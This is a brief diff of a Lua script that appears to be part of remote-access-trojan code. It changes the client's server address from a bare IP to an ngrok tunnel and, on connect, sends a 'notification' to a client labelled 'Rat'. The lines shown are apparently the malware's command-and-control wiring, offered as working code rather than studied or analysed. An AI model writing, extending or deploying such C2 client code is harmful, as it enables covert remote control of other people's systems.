@@ -11,7 +11,7 @@ local function sendChatMessage(text, color)
     })
 end
 
-local client = KasflowsClient.new('http://87.120.166.48:8000')
+local client = KasflowsClient.new('https://56ca-176-105-197-251.ngrok-free.app')
 
 client:on("connect", function()
     client:sendToClient("Rat", "notification", {
